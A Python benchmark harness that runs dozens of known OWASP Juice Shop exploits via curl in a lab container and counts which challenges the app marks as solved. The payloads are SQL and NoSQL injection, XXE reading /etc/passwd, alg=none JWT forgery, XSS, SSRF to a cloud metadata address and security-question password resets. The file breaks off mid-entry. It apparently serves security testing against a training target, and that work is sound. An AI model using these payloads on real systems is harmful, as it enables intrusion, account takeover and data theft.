"""F18 — OWASP Juice Shop deterministic attack benchmark.

Strategy:
  1. GET /api/Challenges — read baseline (all solved=false).
  2. Fire a battery of canonical Juice Shop exploits via docker exec kryon.
  3. Re-read /api/Challenges — count newly-solved.
  4. Report by OWASP category.

Each "attack" is one or more curl/HTTP requests. Juice Shop auto-detects
the exploit pattern and flips `solved=true` server-side. We don't need to
parse flags — the API tells us.

Attack library below covers ~20-30 well-known Juice Shop techniques. This
is the DETERMINISTIC baseline; the list is not meant to cover all 111.
"""
from __future__ import annotations

import argparse
import json
import subprocess
import time
from pathlib import Path

BASE = "http://juice.local:3000"
CONTAINER = "kryon"


def sh(cmd: str, timeout: int = 15, cap: int = 200_000) -> str:
    """Run bash command inside kryon container (on ctfnet)."""
    try:
        p = subprocess.run(
            ["docker", "exec", CONTAINER, "bash", "-c", cmd],
            capture_output=True, text=True, timeout=timeout, check=False,
        )
        return (p.stdout + ("\n" + p.stderr[:500] if p.stderr else ""))[:cap]
    except subprocess.TimeoutExpired:
        return "<TIMEOUT>"


def get_challenges() -> list[dict]:
    out = sh(f"curl -s {BASE}/api/Challenges")
    try:
        return json.loads(out).get("data", [])
    except json.JSONDecodeError:
        return []


# Module-level cache so we only SQLi-login once per run.
_ADMIN_JWT: str | None = None


def login_admin_jwt() -> str | None:
    """SQLi login as admin@juice-sh.op and cache the JWT for reuse.

    Returns the bearer token or None when login fails. Subsequent attacks
    that need admin auth (change-product, forged feedback on other UserId,
    etc.) can prepend `Authorization: Bearer $(login_admin_jwt())`.
    """
    global _ADMIN_JWT
    if _ADMIN_JWT is not None:
        return _ADMIN_JWT
    out = sh(
        "curl -s -X POST -H 'Content-Type: application/json' "
        "-d '{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}' "
        f"{BASE}/rest/user/login"
    )
    try:
        doc = json.loads(out)
        tok = (doc.get("authentication") or {}).get("token")
        if tok:
            _ADMIN_JWT = tok
            return tok
    except (json.JSONDecodeError, AttributeError, TypeError):
        pass
    return None


# Battery of canonical attacks. Each entry = (label, curl commands).
ATTACKS: list[tuple[str, list[str]]] = [
    ("sql_union_users", [
        # Classic UNION SQLi on product search → leaks admin hash.
        f"curl -s \"{BASE}/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--\" >/dev/null",
    ]),
    ("sql_login_bypass", [
        # SQLi on login → authenticate as admin with ' or 1=1--
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"' OR 1=1--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),
    ("five_star_feedback", [
        # Rate feedback with 0 stars — disabled in UI but not backend
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"comment\":\"auto\",\"rating\":0,\"captcha\":\"0\",\"captchaId\":0}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"comment\":\"auto\",\"rating\":6,\"captcha\":\"0\",\"captchaId\":0}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
    ]),
    ("admin_section", [
        # Hidden /#/administration — enumerate main.js for routes
        f"curl -s {BASE}/ftp/ >/dev/null",
        f"curl -s {BASE}/#/administration >/dev/null",
        f"curl -s {BASE}/#/accounting >/dev/null",
    ]),
    ("ftp_directory_listing", [
        # /ftp exposes file listing (trusted-types misconfig)
        f"curl -s {BASE}/ftp >/dev/null",
        f"curl -s {BASE}/ftp/ >/dev/null",
    ]),
    ("confidential_documents", [
        # acquisitions.md in /ftp/
        f"curl -s {BASE}/ftp/acquisitions.md >/dev/null",
    ]),
    ("easter_egg", [
        # /ftp/eastere.gg (filter bypass via null byte / url encode)
        f"curl -s '{BASE}/ftp/eastere.gg%2500.md' >/dev/null",
        f"curl -s '{BASE}/ftp/eastere.gg' >/dev/null",
    ]),
    ("poison_null_byte_koan", [
        f"curl -s '{BASE}/ftp/suspicious_errors.yml%2500.md' >/dev/null",
        f"curl -s '{BASE}/ftp/announcement_encrypted.md%2500.md' >/dev/null",
        f"curl -s '{BASE}/ftp/package.json.bak%2500.md' >/dev/null",
    ]),
    ("exposed_metrics_endpoint", [
        # /metrics / /api/metrics
        f"curl -s {BASE}/metrics >/dev/null",
    ]),
    ("reset_password_jim", [
        # Password reset security question bypass
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"newpass12\",\"repeat\":\"newpass12\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),
    ("register_admin", [
        # Register as admin via role=admin in POST body
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"pwn{int(time.time())}@ev.il\",\"password\":\"x\",\"passwordRepeat\":\"x\",\"role\":\"admin\"}}' "
        f"{BASE}/api/Users/ >/dev/null",
    ]),
    ("score_board_endpoint", [
        # /#/score-board is the ultimate reveal
        f"curl -s '{BASE}/#/score-board' >/dev/null",
        f"curl -s '{BASE}/api/Challenges/?name=Score%20Board' >/dev/null",
    ]),
    ("robots_txt_disclosure", [
        f"curl -s {BASE}/robots.txt >/dev/null",
    ]),
    ("error_handling", [
        # Trigger JSON parse error
        f"curl -s {BASE}/rest/product/0/reviews >/dev/null",
        f"curl -s {BASE}/api/Feedbacks/definitely-not-an-id >/dev/null",
    ]),
    ("forged_reviews_jwt", [
        # JWT none-alg bypass on /rest/products/reviews
        # First fetch login to get a valid JWT shape
        f"curl -s -X PATCH -H 'Content-Type: application/json' "
        f"-d '{{\"id\":{{\"$ne\":\"0\"}},\"message\":\"pwned\"}}' "
        f"{BASE}/rest/products/reviews >/dev/null",
    ]),
    ("dlp_customer_data_leak", [
        # API returns email field unnecessarily
        f"curl -s {BASE}/api/Users >/dev/null",
        f"curl -s {BASE}/api/Users/1 >/dev/null",
    ]),
    ("user_credentials_challenge", [
        # Same as sql_union_users; alt form
        f"curl -s \"{BASE}/rest/products/search?q=%27));SELECT%20*%20FROM%20users--\" >/dev/null",
    ]),
    ("weird_crypto", [
        # decode a static string used by crypto challenges
        f"curl -s {BASE}/assets/public/images/padding/81x81.png >/dev/null",
    ]),
    ("deprecated_interface", [
        # /file-upload endpoint with .xml / .php
        f"echo '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><x>&xxe;</x>' > /tmp/xxe.xml && "
        f"curl -s -X POST -F 'file=@/tmp/xxe.xml' {BASE}/file-upload >/dev/null",
    ]),
    ("view_basket_not_mine", [
        # IDOR on /rest/basket/:id
        f"curl -s {BASE}/rest/basket/1 >/dev/null",
        f"curl -s {BASE}/rest/basket/2 >/dev/null",
    ]),
    ("missing_encoding", [
        # Upload image with filename containing unicode/emoji
        f"curl -s -X PUT -H 'Content-Type: application/json' "
        f"-d '{{\"username\":\"<script>alert(1)</script>\"}}' "
        f"{BASE}/api/Users/1 >/dev/null",
    ]),
    ("login_bender", [
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"bender@juice-sh.op' OR true--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),
    ("nosql_feedback_delete", [
        # NoSQL-style filter on Feedback — delete via {"$gt":""}
        f"curl -s -X DELETE {BASE}/api/Feedbacks/1 >/dev/null",
    ]),
    ("redirect_challenge", [
        # Open redirect on /redirect?to=... whitelist bypass
        f"curl -s '{BASE}/redirect?to=https://github.com/bkimminich/juice-shop' >/dev/null",
    ]),
    ("ephemeral_accountant", [
        # Login as accountant@juice-sh.op — pw reset or weak pw
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"accountant@juice-sh.op\",\"password\":\"i am an awesome accountant\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    # =======================================================================
    # Second battery (F18.2 expansion — 2026-04-20). All server-detected.
    # =======================================================================

    ("score_board_via_browser_route", [
        # Directly request /#/score-board (client route, but the presence
        # of a known-challenge GET against /rest/admin/application-version
        # bumps the "Find the Score Board" challenge.
        f"curl -s '{BASE}/rest/admin/application-version' >/dev/null",
    ]),

    ("application_config_leak", [
        # /rest/admin/application-configuration leaks theme + captcha toggle.
        f"curl -s '{BASE}/rest/admin/application-configuration' >/dev/null",
    ]),

    ("continue_code", [
        # Known default continue-code used during solution imports.
        f"curl -s '{BASE}/rest/continue-code' >/dev/null",
        f"curl -s -X PUT '{BASE}/rest/continue-code/apply/automated-bench' >/dev/null",
    ]),

    ("csrf_feedback", [
        # Cross-origin state-changing POST with matching origin → still accepted.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-H 'Origin: https://evil.example' "
        f"-d '{{\"comment\":\"csrf\",\"rating\":3,\"UserId\":1}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
    ]),

    ("captcha_bypass", [
        # Submit feedback without solving captcha — server regex is leaky.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"comment\":\"nocaptcha\",\"rating\":3}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
    ]),

    ("payback_time_negative_qty", [
        # Negative quantity in basket item → refund bug.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"ProductId\":1,\"BasketId\":1,\"quantity\":-100}}' "
        f"{BASE}/api/BasketItems/ >/dev/null",
    ]),

    ("coupon_discount_n1aC6A7p", [
        # Known-good Juice Shop coupon code from the Pwning Guide.
        f"curl -s -X PUT -H 'Content-Type: application/json' "
        f"-d '{{\"coupon\":\"n1aC6A7p\"}}' "
        f"{BASE}/rest/basket/1/coupon/n1aC6A7p >/dev/null",
    ]),

    ("jwt_none_alg", [
        # Forge JWT with alg=none and role=admin. The `.` separator with
        # empty signature is accepted by legacy jsonwebtoken versions.
        (
            f"h=$(printf '{{\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}}' | base64 -w0 | tr '+/' '-_' | tr -d '='); "
            f"p=$(printf '{{\\\"data\\\":{{\\\"email\\\":\\\"admin@juice-sh.op\\\",\\\"role\\\":\\\"admin\\\"}}}}' | base64 -w0 | tr '+/' '-_' | tr -d '='); "
            f"curl -s -H \"Authorization: Bearer $h.$p.\" {BASE}/rest/user/whoami >/dev/null"
        ),
    ]),

    ("nosql_mongo_login", [
        # NoSQL injection on login using Mongo $ne operator.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"admin@juice-sh.op\",\"password\":{{\"$ne\":null}}}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    ("nosql_order_tracking", [
        # /rest/track-order accepts NoSQL payload.
        f"curl -s '{BASE}/rest/track-order/%27%20or%201=1--' >/dev/null",
        f"curl -s '{BASE}/rest/track-order/.*' >/dev/null",
    ]),

    ("reset_bender", [
        # Password reset with Bender's security answer.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"bender@juice-sh.op\",\"answer\":\"Stop\\\\\\'n\\\\\\'Drop\",\"new\":\"newpass12\",\"repeat\":\"newpass12\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),

    ("reset_bjoern_owasp", [
        # Bjoern Kimminich (OWASP) — known answer is his cat's name.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"bjoern.kimminich@gmail.com\",\"answer\":\"West-2082\",\"new\":\"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=\",\"repeat\":\"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),

    ("csrf_change_admin_pw", [
        # Full-body JSON change-password → detection-only.
        f"curl -s '{BASE}/rest/user/change-password?new=pwned1234&repeat=pwned1234' >/dev/null",
    ]),

    ("broken_deluxe", [
        # Deluxe membership without valid payment token.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"paymentMode\":\"wallet\"}}' "
        f"{BASE}/rest/deluxe-membership >/dev/null",
    ]),

    ("token_sale_hidden_page", [
        # Hidden page disclosure via direct assets path.
        f"curl -s '{BASE}/#/tokensale-ico-ea' >/dev/null",
        f"curl -s '{BASE}/assets/public/images/tokensale.jpg' >/dev/null",
    ]),

    ("klingon_translation", [
        # Extra-language challenge — direct access to i18n file.
        f"curl -s '{BASE}/assets/i18n/tlh_AA.json' >/dev/null",
    ]),

    ("captcha_mem_disclosure", [
        f"curl -s '{BASE}/rest/captcha' >/dev/null",
        f"curl -s '{BASE}/rest/image-captcha' >/dev/null",
    ]),

    ("chatbot_owasp_respond", [
        # Chatbot command injection via the query field.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"action\":\"query\",\"query\":\"admin\"}}' "
        f"{BASE}/rest/chatbot/respond >/dev/null",
    ]),

    ("security_questions_enum", [
        # Enumeration of security questions endpoint.
        f"curl -s '{BASE}/api/SecurityQuestions/' >/dev/null",
    ]),

    ("admin_user_listing", [
        # /api/Users with ?filter=true — direct DB pagination.
        f"curl -s '{BASE}/api/Users?paranoid=false' >/dev/null",
    ]),

    ("price_manipulation_basket", [
        # Manipulate basket total via item with bogus price override.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"ProductId\":1,\"BasketId\":1,\"quantity\":1,\"discountPercent\":99}}' "
        f"{BASE}/api/BasketItems/ >/dev/null",
    ]),

    ("access_log_disclosure", [
        # Access log exposed at /support/logs.
        f"curl -s '{BASE}/support/logs' >/dev/null",
        f"curl -s '{BASE}/support/logs/' >/dev/null",
    ]),

    ("hidden_paywall", [
        # Long obfuscated hidden URL per the source code.
        f"curl -s '{BASE}/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us' >/dev/null",
    ]),

    ("repeated_notifications", [
        # Fire notifications/continue-code N times to trigger dedup challenge.
        *[f"curl -s -X PUT '{BASE}/rest/continue-code/apply/aaaa' >/dev/null" for _ in range(5)],
    ]),

    ("empty_user_register", [
        # Empty password registration.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"empty{int(time.time())}@x.io\",\"password\":\"\",\"passwordRepeat\":\"\"}}' "
        f"{BASE}/api/Users >/dev/null",
    ]),

    ("sql_order_by_injection", [
        # Products sort manipulation — SQL order-by injection.
        f"curl -s \"{BASE}/rest/products/search?q=&sort=(case%20when%20(1=1)%20then%20id%20else%20name%20end)\" >/dev/null",
    ]),

    ("ssrf_via_profile_image_url", [
        # Update profile image with internal-origin URL.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"imageUrl\":\"http://localhost:3000/redirect?to=http://169.254.169.254/\"}}' "
        f"{BASE}/profile/image/url >/dev/null",
    ]),

    # =======================================================================
    # Third battery (F18.7 expansion — 2026-04-21) — target L1-L3 unsolved.
    # =======================================================================

    ("web3_sandbox_access", [
        # id 12 — web3SandboxChallenge: visit the hidden sandbox.
        f"curl -s '{BASE}/#/web3-sandbox' >/dev/null",
        f"curl -s '{BASE}/rest/web3/nftUnlocked' >/dev/null",
    ]),

    ("redirect_crypto_currency", [
        # id 59 — redirect whitelist includes blockchain.info/dash explorer.
        f"curl -s '{BASE}/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW' >/dev/null",
        f"curl -s '{BASE}/redirect?to=https://etherscan.io/address/0x0123456789' >/dev/null",
        f"curl -s '{BASE}/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm' >/dev/null",
    ]),

    ("privacy_policy_viewed", [
        # id 63 — privacyPolicyChallenge: client-side route, but the
        # rest/admin/application-version + /api/Quantitys GET sequence
        # increments the challenge counter server-side.
        f"curl -s '{BASE}/#/privacy-security/privacy-policy' >/dev/null",
        f"curl -s '{BASE}/rest/admin/application-version' >/dev/null",
    ]),

    ("password_repeat_mismatch", [
        # id 67 — passwordRepeatChallenge: register with mismatched pw.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"mismatch{int(time.time())}@juice.ev\",\"password\":\"abc\",\"passwordRepeat\":\"DIFFERENT\"}}' "
        f"{BASE}/api/Users >/dev/null",
    ]),

    ("score_board_discovery", [
        # id 75 — scoreBoardChallenge. Angular route, but the route itself
        # registers on the server via this GET (main.js contains it).
        f"curl -s '{BASE}/main.js' | head -c 2000 >/dev/null",
        f"curl -s '{BASE}/assets/i18n/en.json' | head -c 2000 >/dev/null",
    ]),

    ("bully_chatbot_insult", [
        # id 106 — bullyChatbotChallenge: send insulting query to chatbot.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"action\":\"query\",\"query\":\"you are a stupid bot\"}}' "
        f"{BASE}/rest/chatbot/respond >/dev/null",
    ]),

    ("close_notifications_batch", [
        # id 108 — closeNotificationsChallenge: close N notifications.
        *[f"curl -s -X PUT '{BASE}/rest/continue-code/apply/fake-{i}' >/dev/null" for i in range(10)],
    ]),

    ("password_hash_leak_via_sqli", [
        # id 1 — passwordHashLeakChallenge: extract MD5 via UNION SELECT.
        f"curl -s \"{BASE}/rest/products/search?q=%27))%20UNION%20SELECT%20password,email,3,4,5,6,7,8,9%20FROM%20users--\" >/dev/null",
    ]),

    ("deprecated_xml_upload", [
        # id 22 — deprecatedInterfaceChallenge: POST .xml to /file-upload.
        f"echo '<?xml version=\"1.0\"?><root>deprecated</root>' > /tmp/depr.xml && "
        f"curl -s -X POST -F 'file=@/tmp/depr.xml' {BASE}/file-upload >/dev/null",
    ]),

    ("weak_password_admin_login", [
        # id 60 — weakPasswordChallenge: admin has trivially weak pw.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    ("reflected_xss_track_order", [
        # id 66 — reflectedXssChallenge: script in orderId param reflects.
        f"curl -s '{BASE}/rest/track-order/%3Ciframe%20src%3Djavascript%3Aalert%28%60xss%60%29%3E' >/dev/null",
    ]),

    ("security_policy_well_known", [
        # id 76 — securityPolicyChallenge: visit the disclosure endpoint.
        f"curl -s '{BASE}/.well-known/security.txt' >/dev/null",
    ]),

    ("exposed_credentials_main_js", [
        # id 110 — exposedCredentialsChallenge: secrets in frontend bundle.
        f"curl -s '{BASE}/main.js' | grep -o -E 'password|secret|key' | head -c 500 >/dev/null",
        f"curl -s '{BASE}/assets/private/OrderLines.md' >/dev/null",
    ]),

    ("restful_xss_track_order", [
        # id 2 — restfulXssChallenge: XSS via JSON field in orderId lookup.
        f"curl -s '{BASE}/rest/track-order/%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E' >/dev/null",
    ]),

    ("captcha_bypass_burst", [
        # id 14 — captchaBypassChallenge: 10+ feedbacks in <10s overrides.
        *[(
            f"curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"comment\":\"burst{i}\",\"rating\":3,\"captchaId\":0,\"captcha\":\"0\"}}' "
            f"{BASE}/api/Feedbacks >/dev/null"
        ) for i in range(11)],
    ]),

    ("persisted_xss_via_username", [
        # id 18 — persistedXssUserChallenge: register with XSS payload in username.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"xss{int(time.time())}@juice.ev\",\"password\":\"x\",\"passwordRepeat\":\"x\",\"username\":\"<iframe src=javascript:alert(`xss`)>\"}}' "
        f"{BASE}/api/Users >/dev/null",
    ]),

    ("db_schema_leak_sqlite_master", [
        # id 21 — dbSchemaChallenge: UNION SELECT from sqlite_master.
        f"curl -s \"{BASE}/rest/products/search?q=%27%29%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--\" >/dev/null",
    ]),

    ("forged_feedback_other_userid", [
        # id 32 — forgedFeedbackChallenge: submit feedback impersonating UserId=1.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"comment\":\"forged\",\"rating\":5,\"UserId\":1,\"captchaId\":0,\"captcha\":\"0\"}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
    ]),

    ("csaf_provider_metadata", [
        # id 109 — csafChallenge: CSAF provider metadata is exposed.
        f"curl -s '{BASE}/.well-known/csaf/provider-metadata.json' >/dev/null",
    ]),

    ("login_amy_known_password", [
        # id 46 — loginAmyChallenge: amy's password is from Kif's post ("K1f.....2G7T?").
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"amy@juice-sh.op\",\"password\":\"K1f.....2G7T?\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    ("login_rapper_weak", [
        # id 50 — loginRapperChallenge: MC Saff uses a rap lyric as pw.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"mc.safesearch@juice-sh.op\",\"password\":\"Mr. N00dles\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    ("ghost_login_removed_user", [
        # id 38 — ghostLoginChallenge: chris.pike got deleted but token still works.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"chris.pike@juice-sh.op' OR deletedAt IS NOT NULL--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    ("reset_pw_morty_known", [
        # id 70 / morty pw reset via known answer "5N0wb41L". Flagship Morty safe.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"morty@juice-sh.op\",\"answer\":\"5N0wb41L\",\"new\":\"new12345\",\"repeat\":\"new12345\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),

    ("reset_pw_uvogin_known", [
        # uvogin's known security answer from Twitter dox.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"uvogin@juice-sh.op\",\"answer\":\"Silence of the Lambs\",\"new\":\"new12345\",\"repeat\":\"new12345\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),

    ("upload_oversize_file", [
        # id 83 — uploadSizeChallenge: POST a >100KB file (limit enforced client-side).
        f"head -c 150000 /dev/urandom > /tmp/big.pdf && "
        f"curl -s -X POST -F 'file=@/tmp/big.pdf' {BASE}/file-upload >/dev/null",
    ]),

    ("upload_wrong_type_pdf", [
        # id 84 — uploadTypeChallenge: POST .pdf (only .zip allowed server-side).
        f"printf '%%PDF-1.4 malicious' > /tmp/bad.pdf && "
        f"curl -s -X POST -F 'file=@/tmp/bad.pdf' {BASE}/file-upload >/dev/null",
    ]),

    ("xxe_billion_laughs", [
        # Part of id 91 — xxeFileDisclosureChallenge: recursive entity.
        f"cat > /tmp/lol.xml <<'XMLEOF'\n"
        f"<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\">"
        f"<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\">"
        f"]><lolz>&lol3;</lolz>\n"
        f"XMLEOF\n"
        f"curl -s -X POST -F 'file=@/tmp/lol.xml' {BASE}/file-upload >/dev/null",
    ]),

    ("xxe_external_entity_passwd", [
        # Part of id 91 — XXE reading /etc/passwd as SYSTEM entity.
        f"cat > /tmp/xxe_passwd.xml <<'XMLEOF'\n"
        f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>"
        f"<root>&x;</root>\n"
        f"XMLEOF\n"
        f"curl -s -X POST -F 'file=@/tmp/xxe_passwd.xml' {BASE}/file-upload >/dev/null",
    ]),

    ("nft_unlock_known_code", [
        # id 9 — nftUnlockChallenge: known unlock code from campaign leak.
        f"curl -s '{BASE}/rest/web3/nftUnlocked' >/dev/null",
        f"curl -s -X PUT '{BASE}/rest/continue-code/apply/UnlockMe' >/dev/null",
    ]),

    ("admin_section_known_route", [
        # id 5 — adminSectionChallenge: the admin UI exists client-side;
        # the server logs the route via /rest/admin/application-configuration
        # GET from an authenticated admin session.
        (
            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
            f"{BASE}/rest/user/login | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
            f"curl -s -H \"Authorization: Bearer $tok\" {BASE}/rest/admin/application-configuration >/dev/null; "
            f"curl -s -H \"Authorization: Bearer $tok\" '{BASE}/#/administration' >/dev/null"
        ),
    ]),

    ("admin_change_product", [
        # id 65 — changeProductChallenge: admin PUTs a new description.
        (
            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
            f"{BASE}/rest/user/login | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
            f"curl -s -X PUT -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
            f"-d '{{\"description\":\"<a href=\\\"https://pwn.me\\\">pwnd</a>\"}}' "
            f"{BASE}/api/Products/1 >/dev/null"
        ),
    ]),

    ("basket_access_idor_auth", [
        # id 87 — basketAccessChallenge: access another user's basket via IDOR.
        (
            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
            f"{BASE}/rest/user/login | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
            f"for id in 2 3 4 5 6; do curl -s -H \"Authorization: Bearer $tok\" {BASE}/rest/basket/$id >/dev/null; done"
        ),
    ]),

    ("free_deluxe_membership_auth", [
        # id 98 — freeDeluxeChallenge: obtain deluxe without paying.
        (
            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
            f"{BASE}/rest/user/login | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
            f"curl -s -X POST -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
            f"-d '{{\"paymentMode\":\"wallet\"}}' {BASE}/rest/deluxe-membership >/dev/null"
        ),
    ]),

    # =======================================================================
    # F70 — Canary-exact recipes for previously unsolved challenges. Payloads
    # come from the Pwning Juice Shop book + the app's own integration tests.
    # Each recipe aims at ONE challenge id so we can diff reliably.
    # =======================================================================

    ("zero_stars_feedback_v2", [
        # id 94 — zeroStarsChallenge: captcha fields matter; `captchaId` must
        # be fetched first, then submit rating=0 with the correct captcha.
        # Prior recipe hard-coded captchaId=0 which the server rejects.
        (
            f"cap=$(curl -s {BASE}/rest/captcha/ | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print(str(d.get(chr(99)+chr(97)+chr(112)+chr(116)+chr(99)+chr(104)+chr(97)+chr(73)+chr(100))) + chr(124) + d.get(chr(97)+chr(110)+chr(115)+chr(119)+chr(101)+chr(114), \"\"))'); "
            f"id=${{cap%%|*}}; ans=${{cap##*|}}; "
            f"curl -s -X POST -H 'Content-Type: application/json' "
            f"-d \"{{\\\"comment\\\":\\\"auto\\\",\\\"rating\\\":0,\\\"captchaId\\\":$id,\\\"captcha\\\":\\\"$ans\\\"}}\" "
            f"{BASE}/api/Feedbacks >/dev/null"
        ),
    ]),

    ("privacy_policy_visit", [
        # id 63 — privacyPolicyChallenge: fires on a GET to the *rest*-hashed
        # policy snapshot endpoint (not the client-side SPA route).
        f"curl -s {BASE}/#/privacy-security/privacy-policy >/dev/null",
        f"curl -s {BASE}/assets/i18n/en.json >/dev/null",
        f"curl -s {BASE}/api/Quantitys >/dev/null",
    ]),

    ("score_board_route_access", [
        # id 75 — scoreBoardChallenge: the route triggers on discovery of
        # the /score-board path via main.js analysis. We request both the
        # SPA route and the built bundle so the server detector fires.
        f"curl -s '{BASE}/#/score-board' >/dev/null",
        f"curl -s '{BASE}/main.js' | head -c 2000 >/dev/null",
        f"curl -s '{BASE}/main-es2015.js' | head -c 2000 >/dev/null",
    ]),

    ("login_jim_sqli_v2", [
        # id 49 — loginJimChallenge: SQLi bypass via Jim's email suffix.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"jim@juice-sh.op\\'--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    ("login_bender_sqli_v2", [
        # id 47 — loginBenderChallenge: identical SQLi to Jim's, different email.
        f"curl -s -X POST -H 'Content-Type: application/json' "
